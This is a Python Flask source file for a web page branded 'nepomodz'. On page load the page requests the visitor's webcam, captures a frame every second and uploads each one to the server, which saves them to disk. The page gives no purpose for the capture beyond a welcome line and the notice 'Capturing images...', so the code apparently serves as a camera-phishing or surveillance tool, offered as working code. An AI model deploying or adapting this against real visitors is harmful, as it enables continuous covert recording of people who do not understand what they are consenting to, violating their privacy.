from flask import Flask, request, render_template_string, jsonify
from datetime import datetime
import os

app = Flask(__name__)

# Directory to save images
IMAGE_DIR = "captured_images"
if not os.path.exists(IMAGE_DIR):
    os.makedirs(IMAGE_DIR)

# HTML template with JavaScript to request camera access and capture images
HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>nepomodz Camera Access</title>
    <script>
        let isCapturing = false;
        let mediaStream = null;

        function startCapture() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    mediaStream = stream;
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    // Start capturing images
                    isCapturing = true;
                    captureFrame(video);
                })
                .catch(function(err) {
                    alert("Camera access denied.");
                });
        }

        function captureFrame(video) {
            if (!isCapturing) return;

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Send the image data to the server
            canvas.toBlob(function(blob) {
                const formData = new FormData();
                formData.append('image', blob);

                fetch('/upload', {
                    method: 'POST',
                    body: formData
                }).then(response => response.json())
                  .then(data => console.log(data))
                  .catch(error => console.error(error));
            }, 'image/jpeg');

            // Capture the next frame after a delay
            setTimeout(() => captureFrame(video), 1000); // Capture every 1 second
        }

        function stopCapture() {
            isCapturing = false;
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        }

        // Start capturing when the page loads
        window.onload = startCapture;

        // Stop capturing when the user leaves the page
        window.onbeforeunload = stopCapture;
    </script>
</head>
<body>
    <h1>Welcome to nepomodz</h1>
    <p>Camera access granted. Capturing images...</p>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/upload', methods=['POST'])
def upload():
    if 'image' not in request.files:
        return jsonify({"error": "No image provided"}), 400

    image = request.files['image']
    if image.filename == '':
        return jsonify({"error": "No image selected"}), 400

    # Save the image to the captured_images directory
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    image_path = os.path.join(IMAGE_DIR, f"image_{timestamp}.jpg")
    image.save(image_path)

    return jsonify({"message": "Image saved successfully", "path": image_path})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
